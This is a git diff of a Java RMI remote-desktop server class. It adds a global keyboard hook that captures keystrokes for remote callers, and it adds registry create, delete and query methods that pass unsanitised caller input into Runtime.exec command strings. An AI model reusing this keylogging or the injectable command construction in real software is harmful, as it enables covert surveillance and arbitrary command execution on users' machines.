@@ -3,6 +3,9 @@ package BE.RMI;
 import FE.Information.ComputerInfo;
 import FE.Information.DriveInfo;
 import com.sun.management.OperatingSystemMXBean;
+import lc.kra.system.keyboard.GlobalKeyboardHook;
+import lc.kra.system.keyboard.event.GlobalKeyAdapter;
+import lc.kra.system.keyboard.event.GlobalKeyEvent;
 
 
 import javax.imageio.ImageIO;
@@ -19,6 +22,7 @@ import java.rmi.RemoteException;
 import java.rmi.server.UnicastRemoteObject;
 import java.util.ArrayList;
 
+import java.util.Date;
 import java.util.Optional;
 
 public class RemoteDesktopImpl extends UnicastRemoteObject implements IRemoteDesktop {
@@ -26,6 +30,7 @@ public class RemoteDesktopImpl extends UnicastRemoteObject implements IRemoteDes
 
   private Robot mr_robot;
   private OperatingSystemMXBean os;
+//  private K
 
 
   public RemoteDesktopImpl() throws RemoteException, AWTException {
@@ -118,18 +123,6 @@ public class RemoteDesktopImpl extends UnicastRemoteObject implements IRemoteDes
     return pc_info;
   }
 
-  private String processDetails(ProcessHandle process) {
-    return String.format("%8s %8s %30s %10s",
-        process.pid(),
-        text(process.info().user()),
-        text(process.info().startInstant()),
-        text(process.info().command()));
-  }
-
-  private static String text(Optional<?> optional) {
-    return optional.map(Object::toString).orElse("-");
-  }
-
   @Override
   public String getProcessList() throws RemoteException {
     String str = "";
@@ -176,44 +169,6 @@ public class RemoteDesktopImpl extends UnicastRemoteObject implements IRemoteDes
     return true;
   }
 
-
-//  public interface User32 extends StdCallLibrary {
-//    User32 INSTANCE = (User32) Native.loadLibrary("user32", User32.class);
-//
-//    interface WNDENUMPROC extends StdCallCallback {
-//      boolean callback(Pointer hWnd, Pointer arg);
-//    }
-//
-//    boolean EnumWindows(User32.WNDENUMPROC lpEnumFunc, Pointer userData);
-//    int GetWindowTextA(Pointer hWnd, byte[] lpString, int nMaxCount);
-//    int GetWindowThreadProcessId(Pointer hWnd, IntByReference lpString);
-//  }
-//  @Override
-//  public ArrayList<String> getListApp() {
-//    final ArrayList<String> windowNames = new ArrayList<String>();
-//    final User32 user32 = User32.INSTANCE;
-//    user32.EnumWindows(new User32.WNDENUMPROC() {
-//      @Override
-//      public boolean callback(Pointer hWnd, Pointer arg) {
-//        byte[] windowText = new byte[512];
-//        IntByReference pidPointer = new IntByReference();
-//
-//        user32.GetWindowTextA(hWnd, windowText, 512);
-//        user32.GetWindowThreadProcessId(hWnd, pidPointer);
-//        int pid = pidPointer.getValue();
-//
-//        String wText = Native.toString(windowText).trim();
-//        if (!wText.isEmpty()) {
-//          String wTexts = Native.toString(windowText).trim() + " - " + String.valueOf(pid);
-//          windowNames.add(wTexts);
-//        }
-//        return true;
-//      }
-//    }, null);
-//
-//    return windowNames;
-//  }
-
   @Override
   public String getAppList() throws RemoteException {
     String str = "";
@@ -239,11 +194,41 @@ public class RemoteDesktopImpl extends UnicastRemoteObject implements IRemoteDes
   }
 
   @Override
-  public String getRegistryList() throws RemoteException {
+  public boolean createRegistry(String keyPath, String keyName, String keyValue) throws RemoteException {
+    try {
+      Process writer = Runtime.getRuntime().exec(
+            "reg add " + keyPath + " /t REG_SZ /v \"" + keyName + "\" /d "
+                + keyValue + " /f" );
+    } catch (IOException e) {
+      return false;
+    }
+    return true;
+  }
+
+  @Override
+  public boolean delRegistry(String keyPath, String keyName) throws RemoteException {
+    try {
+      Process writer = Runtime.getRuntime().exec("reg delete " + keyPath + " /v " + keyName + " /f");
+    } catch (IOException e) {
+      return false;
+    }
+    return true;
+  }
+
+  @Override
+  public String getRegistryList(String keyPath, String keyName) throws RemoteException {
     String str = "";
     try {
-      Process p = Runtime.getRuntime().exec("reg query " + '"'+ "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\"
-          + "Explorer\\Shell Folders" + "\" /v " + "Personal");
+      Process p = null;
+      if (!keyName.isEmpty() || !keyName.equals("")) {
+        p = Runtime.getRuntime().exec("reg query " +
+            '"'+ keyPath + "\" /v " + keyName);
+      }
+      else {
+        p = Runtime.getRuntime().exec("reg query " +
+            '"'+ keyPath + "\" ");
+      }
+
       BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
 
       String line;
@@ -255,7 +240,8 @@ public class RemoteDesktopImpl extends UnicastRemoteObject implements IRemoteDes
       }
 
       str = stringBuilder.toString();
-
+      System.out.println(keyPath);
+      System.out.println(keyName);
       System.out.println(str);
     } catch (Exception err) {
       err.printStackTrace();
@@ -264,12 +250,20 @@ public class RemoteDesktopImpl extends UnicastRemoteObject implements IRemoteDes
   }
 
   @Override
-  public ArrayList<Integer>  getKeystrokeList() throws RemoteException {
-    ArrayList<Integer> list = new ArrayList<>();
+  public ArrayList<String> getKeystroke(ArrayList<String> keyList) throws RemoteException {
+    ArrayList<String> a = new ArrayList<>();
+    GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
+    keyboardHook.addKeyListener(new GlobalKeyAdapter() {
+      @Override
+      public void keyPressed(GlobalKeyEvent event) {
+        System.out.println(new Date() + " " + event.getKeyChar());
+        a.add(String.valueOf(event.getKeyChar()));
+      }
 
+    });
+    System.out.println("Keyy" + a.toString());
 
-
-    return list;
+    return a;
   }
 
   @Override
@@ -282,6 +276,5 @@ public class RemoteDesktopImpl extends UnicastRemoteObject implements IRemoteDes
     }
     return true;
   }
-
 
 }
